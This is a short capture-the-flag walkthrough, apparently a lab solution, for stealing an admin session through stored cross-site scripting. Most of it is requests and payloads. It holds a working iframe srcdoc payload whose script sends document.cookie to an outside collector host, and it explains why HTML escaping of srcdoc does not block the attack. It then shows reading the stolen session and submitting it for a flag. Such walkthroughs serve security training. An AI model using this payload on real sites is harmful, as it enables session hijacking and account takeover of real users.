Full chain:

```
POST /posts
Content-Type: application/json

{"body":"<iframe srcdoc=\"<script>new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)</script>\"></iframe>"}
```

The response echoes the stored HTML — you'll see the iframe survived, with the
`srcdoc` value HTML-escaped (`&lt;script>…`). That escaping does not save the
defender: the browser decodes it and parses the `srcdoc` as a document.

Wait ~2 seconds for the admin bot to load `/admin/feed`. Then read what the
collector captured through the app's proxy:

```
GET /oob/received
```

You will see an item with a path like `/report?c=session%3D<32 hex>`. That hex
value is the admin session. Submit it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{...}`. (`/solve` accepts either the bare 32-hex value or the
full `session=<value>` string.)
